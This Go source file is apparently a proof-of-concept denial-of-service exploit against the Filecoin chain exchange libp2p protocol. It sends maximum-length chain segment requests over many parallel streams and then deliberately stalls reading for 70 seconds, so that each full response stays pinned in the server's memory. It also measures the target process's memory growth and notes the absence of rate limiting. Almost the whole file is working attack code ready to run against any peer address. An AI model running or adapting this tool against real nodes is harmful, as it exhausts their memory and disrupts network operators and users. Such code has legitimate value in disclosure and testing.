package main

import (
	"bytes"
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p"
	"github.com/libp2p/go-libp2p/core/crypto"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/libp2p/go-libp2p/core/peerstore"
	"github.com/multiformats/go-multiaddr"
)

const proto = "/fil/chain/xchg/0.0.1"

/// encodeReq builds CBOR-encoded Request{Head, Length, Options}
/// matches chain/exchange/cbor_gen.go MarshalCBOR format
func encodeReq(heads []cid.Cid, length, opts uint64) []byte {
	var b bytes.Buffer

	/// cbor array(3)
	b.WriteByte(0x83)

	/// heads: []cid.Cid
	b.WriteByte(0x80 | byte(len(heads)))
	for _, c := range heads {
		/// cid cbor tag(42) + identity multibase prefix
		b.Write([]byte{0xd8, 0x2a})
		cb := append([]byte{0x00}, c.Bytes()...)
		if len(cb) < 24 {
			b.WriteByte(0x40 | byte(len(cb)))
		} else {
			b.WriteByte(0x58)
			b.WriteByte(byte(len(cb)))
		}
		b.Write(cb)
	}

	/// length: uint64
	writeUint(&b, length)
	/// options: uint64
	writeUint(&b, opts)

	return b.Bytes()
}

func writeUint(w *bytes.Buffer, v uint64) {
	switch {
	case v < 24:
		w.WriteByte(byte(v))
	case v < 256:
		w.Write([]byte{0x18, byte(v)})
	case v < 65536:
		w.WriteByte(0x19)
		binary.Write(w, binary.BigEndian, uint16(v))
	default:
		w.WriteByte(0x1b)
		binary.Write(w, binary.BigEndian, v)
	}
}

/// getHead fetches chain head via JSON-RPC
/// parses CIDs from DAG-JSON format: {"/": "bafy..."}
func getHead(api string) ([]cid.Cid, uint64, error) {
	resp, err := http.Post(api, "application/json",
		strings.NewReader(`{"jsonrpc":"2.0","method":"Filecoin.ChainHead","params":[],"id":1}`))
	if err != nil {
		return nil, 0, err
	}
	defer resp.Body.Close()

	data, _ := io.ReadAll(resp.Body)

	/// parse DAG-JSON cid format {"/": "bafy..."}
	var r struct {
		Result struct {
			Cids []struct {
				Root string `json:"/"`
			} `json:"Cids"`
			Height uint64 `json:"Height"`
		} `json:"result"`
	}
	if err := json.Unmarshal(data, &r); err != nil {
		return nil, 0, err
	}

	var cids []cid.Cid
	for _, c := range r.Result.Cids {
		parsed, err := cid.Decode(c.Root)
		if err != nil {
			return nil, 0, err
		}
		cids = append(cids, parsed)
	}
	return cids, r.Result.Height, nil
}

/// getRSS reads VmRSS from /proc/pid/status (linux only)
func getRSS(pid int) int64 {
	if pid <= 0 {
		return 0
	}
	data, _ := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "VmRSS:") {
			v, _ := strconv.ParseInt(strings.Fields(line)[1], 10, 64)
			return v
		}
	}
	return 0
}

/// attack opens stream, sends max-length request, then stalls read
///
/// the server builds full []*BSTipSet response in heap via collectChainSegment,
/// then calls WriteCborRPC(buffered, resp) with 60s WriteResDeadline.
/// if response > TCP send buffer (~128-256KB) and we don't read,
/// the server goroutine blocks on write with the full response pinned in memory.
///
/// on short chains (devnet) the response is small enough to fit in TCP buffer
/// so the server won't actually block. need chain depth >= 900 epochs for full effect.
func attack(ctx context.Context, h host.Host, t peer.ID, req []byte, out chan<- bool) {
	s, err := h.NewStream(ctx, t, proto)
	if err != nil {
		out <- false
		return
	}
	defer s.Close()

	/// send request & signal done writing
	s.Write(req)
	s.CloseWrite()

	/// don't read. let TCP backpressure build.
	/// server goroutine pins response in heap until WriteResDeadline (60s) fires.
	/// we wait 70s to outlast the server's deadline.
	time.Sleep(70 * time.Second)

	/// drain whatever's left so stream closes clean
	io.Copy(io.Discard, s)

	out <- true
}

func main() {
	if len(os.Args) < 5 {
		fmt.Fprintf(os.Stderr, "usage: %s <api> <multiaddr> <peerid> <streams> [pid] [rounds]\n", os.Args[0])
		os.Exit(1)
	}

	api, addr, peerStr := os.Args[1], os.Args[2], os.Args[3]
	n, _ := strconv.Atoi(os.Args[4])
	pid := 0
	if len(os.Args) > 5 {
		pid, _ = strconv.Atoi(os.Args[5])
	}
	rounds := 1
	if len(os.Args) > 6 {
		rounds, _ = strconv.Atoi(os.Args[6])
	}

	heads, height, err := getHead(api)
	if err != nil {
		fmt.Fprintf(os.Stderr, "getHead: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("chain height: %d\n", height)
	if height < 900 {
		fmt.Fprintf(os.Stderr, "warn: chain height < 900, responses will be small (need calibnet or long devnet)\n")
	}

	/// Length=900 (MaxRequestLength = policy.ChainFinality)
	/// Options=3 (Headers|Messages)
	req := encodeReq(heads, 900, 3)
	fmt.Printf("request size: %d bytes\n", len(req))

	priv, _, _ := crypto.GenerateKeyPair(crypto.Ed25519, -1)
	h, _ := libp2p.New(libp2p.Identity(priv))
	defer h.Close()

	ma, _ := multiaddr.NewMultiaddr(addr)
	target, _ := peer.Decode(peerStr)
	h.Peerstore().AddAddr(target, ma, peerstore.PermanentAddrTTL)

	ctx := context.Background()
	if err := h.Connect(ctx, peer.AddrInfo{ID: target, Addrs: []multiaddr.Multiaddr{ma}}); err != nil {
		fmt.Fprintf(os.Stderr, "connect: %v\n", err)
		os.Exit(1)
	}

	baseRSS := getRSS(pid)
	var peakRSS int64

	/// monitor RSS in background
	done := make(chan struct{})
	go func() {
		tick := time.NewTicker(500 * time.Millisecond)
		defer tick.Stop()
		for {
			select {
			case <-tick.C:
				if rss := getRSS(pid); rss > atomic.LoadInt64(&peakRSS) {
					atomic.StoreInt64(&peakRSS, rss)
				}
			case <-done:
				return
			}
		}
	}()

	t0 := time.Now()
	totalOK := 0

	for round := 0; round < rounds; round++ {
		if rounds > 1 {
			fmt.Printf("\n--- round %d/%d ---\n", round+1, rounds)
		}

		results := make(chan bool, n)
		var wg sync.WaitGroup

		roundStart := time.Now()
		for i := 0; i < n; i++ {
			wg.Add(1)
			go func() {
				defer wg.Done()
				attack(ctx, h, target, req, results)
			}()
		}
		go func() { wg.Wait(); close(results) }()

		ok := 0
		for r := range results {
			if r {
				ok++
			}
		}
		totalOK += ok

		rssNow := getRSS(pid)
		peak := atomic.LoadInt64(&peakRSS)
		fmt.Printf("streams: %d/%d\n", ok, n)
		fmt.Printf("time: %.1fs\n", time.Since(roundStart).Seconds())
		if pid > 0 {
			fmt.Printf("rss now: %dM (peak %dM)\n", rssNow/1024, peak/1024)
		}
		if ok == n {
			fmt.Printf("result: all streams accepted, no rate limiting, no GoAway\n")
		}
	}

	close(done)
	finalRSS := getRSS(pid)
	peak := atomic.LoadInt64(&peakRSS)

	fmt.Printf("\n--- summary ---\n")
	fmt.Printf("total streams: %d/%d across %d round(s)\n", totalOK, n*rounds, rounds)
	fmt.Printf("total time: %.1fs\n", time.Since(t0).Seconds())
	if pid > 0 && baseRSS > 0 {
		fmt.Printf("rss: %dM -> %dM (peak %dM, growth %dM)\n",
			baseRSS/1024, finalRSS/1024, peak/1024, (peak-baseRSS)/1024)
	}
}
